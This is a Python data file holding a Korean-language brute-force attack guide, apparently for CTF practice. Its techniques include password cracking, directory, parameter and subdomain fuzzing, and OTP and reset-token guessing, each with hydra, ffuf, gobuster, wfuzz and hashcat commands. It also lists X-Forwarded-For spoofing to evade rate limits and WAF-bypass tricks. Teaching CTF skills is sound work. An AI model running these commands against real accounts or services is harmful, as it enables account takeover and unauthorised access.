"""Brute Force Attack Learning Guide."""

BRUTEFORCE_GUIDE = {
    "attack_type": "bruteforce",
    "title": "Brute Force Attack Guide",
    "severity": "high",
    "difficulty": "beginner",

    "overview": """Brute Force 공격은 가능한 모든 조합을 시도하여 인증을 우회하거나 숨겨진 리소스를 발견하는 공격입니다.
패스워드 크래킹, 디렉토리/파일 열거, 파라미터 퍼징 등 다양한 형태로 활용됩니다.

CTF에서는 주로 로그인 우회, 숨겨진 페이지 발견, 토큰/세션 예측에 사용됩니다.
효과적인 브루트포스는 좋은 워드리스트와 적절한 도구 선택이 핵심입니다.""",

    "impact": [
        "인증 우회 및 계정 탈취",
        "숨겨진 디렉토리/파일 발견",
        "관리자 페이지 접근",
        "API 엔드포인트 열거",
        "세션/토큰 예측",
        "비밀 파라미터 발견",
    ],

    "vulnerable_patterns": [
        "Rate limiting 미적용 로그인",
        "예측 가능한 토큰/세션 ID",
        "디렉토리 리스팅 비활성화 + 숨겨진 파일",
        "계정 잠금 정책 미적용",
    ],

    "techniques": {
        "password_bruteforce": {
            "name": "Password Brute Force",
            "difficulty": "beginner",
            "how_it_works": """로그인 폼에 다양한 비밀번호 조합을 시도합니다.
일반적인 비밀번호 목록(rockyou.txt 등)이나 타겟 맞춤 워드리스트를 사용합니다.
응답 크기, 상태 코드, 메시지 차이로 성공 여부를 판단합니다.""",
            "prerequisites": [
                "로그인 폼 또는 인증 엔드포인트",
                "Rate limiting이 없거나 우회 가능",
                "유효한 사용자명 (또는 사용자명도 브루트포스)",
            ],
            "payloads": [
                {"payload": "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form", "purpose": "Hydra HTTP POST 브루트포스", "expected": "유효한 비밀번호 발견"},
                {"payload": "ffuf -u URL -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt", "purpose": "ffuf POST 브루트포스", "expected": "다른 응답 크기"},
                {"payload": "wfuzz -c -z file,passwords.txt -d 'user=admin&pass=FUZZ' URL", "purpose": "wfuzz 브루트포스", "expected": "성공 응답"},
                {"payload": "burp intruder + Sniper mode", "purpose": "Burp Suite 사용", "expected": "다른 상태 코드/길이"},
            ],
            "detection_patterns": [
                "응답 길이가 다른 요청 발견",
                "상태 코드 변화 (302 리다이렉트 등)",
                "응답 메시지 차이 ('Invalid' vs 'Welcome')",
                "Set-Cookie 헤더 출현",
            ],
            "common_mistakes": [
                "CSRF 토큰 미포함 - 매 요청마다 새 토큰 필요",
                "세션 쿠키 미포함",
                "너무 빠른 요청 - Rate limiting 트리거",
            ],
        },

        "directory_bruteforce": {
            "name": "Directory/File Enumeration",
            "difficulty": "beginner",
            "how_it_works": """웹 서버에서 숨겨진 디렉토리나 파일을 찾습니다.
robots.txt에 없는 관리자 페이지, 백업 파일, 설정 파일 등을 발견할 수 있습니다.
CTF에서 flag 파일이나 숨겨진 힌트를 찾는 데 필수입니다.""",
            "prerequisites": [
                "웹 서버 접근",
                "좋은 워드리스트 (dirbuster, SecLists)",
            ],
            "payloads": [
                {"payload": "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt", "purpose": "Gobuster 디렉토리 스캔", "expected": "숨겨진 경로 발견"},
                {"payload": "ffuf -u http://target/FUZZ -w common.txt -mc 200,301,302,403", "purpose": "ffuf 디렉토리 퍼징", "expected": "유효한 경로"},
                {"payload": "dirsearch -u http://target -e php,txt,html,bak", "purpose": "dirsearch 확장자 스캔", "expected": "백업 파일 등"},
                {"payload": "feroxbuster -u http://target -w wordlist.txt --depth 2", "purpose": "Feroxbuster 재귀 스캔", "expected": "중첩 디렉토리"},
            ],
            "detection_patterns": [
                "200 OK 응답",
                "301/302 리다이렉트 (디렉토리 존재)",
                "403 Forbidden (존재하지만 접근 불가)",
                "응답 크기가 404와 다름",
            ],
            "common_mistakes": [
                "확장자 미지정 - .php, .bak, .old 등 추가",
                "대소문자 구분 서버에서 소문자만 시도",
                "커스텀 404 페이지 - 상태 코드 대신 응답 크기로 필터",
            ],
        },

        "parameter_fuzzing": {
            "name": "Parameter Fuzzing",
            "difficulty": "intermediate",
            "how_it_works": """숨겨진 GET/POST 파라미터를 발견합니다.
debug, admin, test, id 등 일반적인 파라미터명을 시도하여
숨겨진 기능이나 권한 상승 벡터를 찾습니다.""",
            "prerequisites": [
                "타겟 URL 또는 API 엔드포인트",
                "파라미터 워드리스트 (SecLists/burp-parameter-names.txt)",
            ],
            "payloads": [
                {"payload": "ffuf -u 'http://target?FUZZ=test' -w params.txt -fs 1234", "purpose": "GET 파라미터 퍼징", "expected": "숨겨진 파라미터"},
                {"payload": "arjun -u http://target --get", "purpose": "Arjun 자동 파라미터 발견", "expected": "유효한 파라미터 목록"},
                {"payload": "paramspider -d target.com", "purpose": "URL에서 파라미터 추출", "expected": "사용된 파라미터 목록"},
                {"payload": "wfuzz -c -z file,params.txt 'http://target?FUZZ=1'", "purpose": "wfuzz 파라미터 퍼징", "expected": "응답 차이"},
            ],
            "detection_patterns": [
                "응답 크기 변화",
                "다른 에러 메시지",
                "새로운 기능 노출",
                "디버그 정보 출력",
            ],
            "common_mistakes": [
                "기본 응답 크기 필터링 안 함 - --fs로 제외",
                "POST 바디도 확인 필요",
                "JSON API는 Content-Type 헤더 필요",
            ],
        },

        "token_bruteforce": {
            "name": "Token/Session Brute Force",
            "difficulty": "intermediate",
            "how_it_works": """예측 가능한 토큰이나 세션 ID를 브루트포스합니다.
순차적 ID, 약한 난수 생성, 타임스탬프 기반 토큰 등이 대상입니다.
비밀번호 재설정 토큰, OTP, 초대 코드 등에 적용됩니다.""",
            "prerequisites": [
                "토큰 패턴 분석 완료",
                "토큰이 예측 가능하거나 짧음",
                "Rate limiting 없음",
            ],
            "payloads": [
                {"payload": "ffuf -u 'http://target/reset?token=FUZZ' -w tokens.txt", "purpose": "리셋 토큰 브루트포스", "expected": "유효한 토큰"},
                {"payload": "seq 1000 9999 | while read i; do curl ...; done", "purpose": "숫자 토큰 브루트포스", "expected": "성공 응답"},
                {"payload": "crunch 4 4 0123456789 | ffuf -u 'URL?otp=FUZZ' -w -", "purpose": "4자리 OTP 브루트포스", "expected": "인증 성공"},
                {"payload": "hashcat -a 3 -m 0 hash ?d?d?d?d?d?d", "purpose": "6자리 PIN 크래킹", "expected": "PIN 발견"},
            ],
            "detection_patterns": [
                "리다이렉트 또는 성공 메시지",
                "세션 쿠키 발급",
                "다른 페이지 내용",
            ],
            "common_mistakes": [
                "토큰 만료 시간 고려 안 함",
                "토큰 사용 후 무효화 체크",
                "대소문자 구분 여부 확인",
            ],
        },

        "rate_limit_bypass": {
            "name": "Rate Limiting Bypass",
            "difficulty": "advanced",
            "how_it_works": """Rate limiting을 우회하여 브루트포스를 계속합니다.
IP 로테이션, 헤더 조작, 요청 분산 등의 기법을 사용합니다.
CTF에서는 주로 간단한 우회가 가능하도록 설계됩니다.""",
            "prerequisites": [
                "Rate limiting 존재 확인",
                "우회 가능한 구현 취약점",
            ],
            "payloads": [
                {"payload": "X-Forwarded-For: 127.0.0.1", "purpose": "IP 스푸핑 헤더", "expected": "Rate limit 우회"},
                {"payload": "X-Real-IP: 10.0.0.FUZZ", "purpose": "다양한 IP 시뮬레이션", "expected": "제한 우회"},
                {"payload": "X-Originating-IP: 127.0.0.1", "purpose": "대체 IP 헤더", "expected": "제한 리셋"},
                {"payload": "POST /login HTTP/1.1\\nX-Forwarded-For: FUZZ", "purpose": "헤더 퍼징", "expected": "우회 성공"},
            ],
            "detection_patterns": [
                "429 응답 후 헤더 추가시 200 응답",
                "제한 카운터 리셋",
                "다른 에러 메시지",
            ],
            "common_mistakes": [
                "모든 IP 헤더 시도 필요",
                "Null byte, 특수문자 시도",
                "대문자/소문자 변형 시도",
            ],
        },

        "subdomain_bruteforce": {
            "name": "Subdomain Enumeration",
            "difficulty": "beginner",
            "how_it_works": """타겟 도메인의 서브도메인을 발견합니다.
dev, staging, admin, api 등 숨겨진 서브도메인에서
취약점이나 민감 정보를 찾을 수 있습니다.""",
            "prerequisites": [
                "타겟 도메인",
                "서브도메인 워드리스트",
            ],
            "payloads": [
                {"payload": "ffuf -u http://FUZZ.target.com -w subdomains.txt -H 'Host: FUZZ.target.com'", "purpose": "가상 호스트 퍼징", "expected": "서브도메인 발견"},
                {"payload": "gobuster vhost -u http://target.com -w subdomains.txt", "purpose": "Gobuster vhost 모드", "expected": "가상 호스트"},
                {"payload": "subfinder -d target.com", "purpose": "패시브 서브도메인 수집", "expected": "알려진 서브도메인"},
                {"payload": "wfuzz -c -z file,subdomains.txt -H 'Host: FUZZ.target.com' http://IP", "purpose": "wfuzz vhost", "expected": "숨겨진 호스트"},
            ],
            "detection_patterns": [
                "다른 응답 크기 (기본 페이지와 다름)",
                "다른 콘텐츠",
                "특정 서브도메인만 200 응답",
            ],
            "common_mistakes": [
                "와일드카드 DNS 확인 - 기본 응답 크기 필터링",
                "IP 직접 접속 시 Host 헤더 필수",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "타겟 분석",
            "expected_result": "브루트포스 대상 식별 (로그인, 디렉토리, 파라미터 등)",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "robots.txt, 소스코드 주석 확인"
        },
        {
            "step": 2,
            "action": "Rate Limiting 확인",
            "expected_result": "제한 여부 및 임계값 파악",
            "command_example": "for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code}' URL; done",
            "notes": "429, 503 응답 또는 CAPTCHA 확인"
        },
        {
            "step": 3,
            "action": "적절한 워드리스트 선택",
            "expected_result": "타겟에 맞는 워드리스트",
            "command_example": "ls /usr/share/wordlists/",
            "notes": "SecLists, rockyou, dirbuster 등"
        },
        {
            "step": 4,
            "action": "기본 응답 분석",
            "expected_result": "정상/실패 응답 패턴 파악",
            "command_example": "curl -v http://target/login -d 'user=test&pass=test'",
            "notes": "응답 크기, 상태 코드, 메시지 기록"
        },
        {
            "step": 5,
            "action": "필터 설정",
            "expected_result": "노이즈 제거 필터",
            "command_example": "ffuf ... -fs 1234 -fc 404",
            "notes": "기본 응답 크기/코드 제외"
        },
        {
            "step": 6,
            "action": "브루트포스 실행",
            "expected_result": "유효한 결과 발견",
            "command_example": "ffuf -u http://target/FUZZ -w wordlist.txt",
            "notes": "속도 조절 (-rate, -t 옵션)"
        },
        {
            "step": 7,
            "action": "결과 검증",
            "expected_result": "발견된 항목 수동 확인",
            "command_example": "curl http://target/discovered_path",
            "notes": "False positive 제거"
        },
        {
            "step": 8,
            "action": "추가 열거",
            "expected_result": "발견된 경로에서 추가 브루트포스",
            "command_example": "ffuf -u http://target/admin/FUZZ -w wordlist.txt",
            "notes": "재귀적 스캔"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "응답 크기 차이",
            "confidence": "high",
            "db_specific": None,
            "example_response": "대부분 1234 bytes, 성공시 5678 bytes"
        },
        {
            "pattern_type": "status_code",
            "indicator": "상태 코드 변화",
            "confidence": "high",
            "db_specific": None,
            "example_response": "실패: 401, 성공: 200 또는 302"
        },
        {
            "pattern_type": "behavior",
            "indicator": "Set-Cookie 헤더 출현",
            "confidence": "high",
            "db_specific": None,
            "example_response": "Set-Cookie: session=abc123"
        },
        {
            "pattern_type": "behavior",
            "indicator": "응답 메시지 변화",
            "confidence": "medium",
            "db_specific": None,
            "example_response": "'Invalid credentials' vs 'Welcome admin'"
        },
        {
            "pattern_type": "behavior",
            "indicator": "리다이렉트 발생",
            "confidence": "high",
            "db_specific": None,
            "example_response": "Location: /dashboard"
        },
        {
            "pattern_type": "timing",
            "indicator": "응답 시간 차이",
            "confidence": "medium",
            "db_specific": None,
            "example_response": "실패: 100ms, 성공: 500ms (DB 조회)"
        },
    ],

    "waf_bypass": [
        {
            "technique": "IP 스푸핑 헤더",
            "example": "X-Forwarded-For: 127.0.0.1",
            "effective_against": "헤더 기반 Rate limiting"
        },
        {
            "technique": "User-Agent 로테이션",
            "example": "랜덤 User-Agent 사용",
            "effective_against": "UA 기반 차단"
        },
        {
            "technique": "요청 간 지연",
            "example": "--delay 100ms",
            "effective_against": "시간 기반 Rate limiting"
        },
        {
            "technique": "대소문자 변형",
            "example": "ADMIN, Admin, admin",
            "effective_against": "대소문자 구분 필터"
        },
        {
            "technique": "인코딩 변형",
            "example": "%61dmin (URL 인코딩)",
            "effective_against": "키워드 블랙리스트"
        },
        {
            "technique": "파라미터 오염",
            "example": "user=admin&user=test",
            "effective_against": "단순 파라미터 검사"
        },
    ],

    "ctf_tips": [
        "rockyou.txt의 상위 1000개만 먼저 시도 - 대부분 여기서 발견",
        "ffuf이 가장 빠름: ffuf -u URL/FUZZ -w wordlist.txt",
        "커스텀 404 주의 - 응답 크기(-fs)로 필터링",
        "admin, flag, secret, backup, .git, .env 먼저 시도",
        "robots.txt, sitemap.xml 확인 필수",
        "응답에 'Invalid username' vs 'Invalid password' 차이 확인 (username enumeration)",
        "X-Forwarded-For 헤더로 Rate limit 우회 시도",
        "4자리 PIN은 0000-9999 브루트포스 가능 (10000개)",
        "Base64 인코딩된 토큰은 디코딩 후 패턴 분석",
        "SecLists는 최고의 워드리스트 모음: github.com/danielmiessler/SecLists",
    ],
}
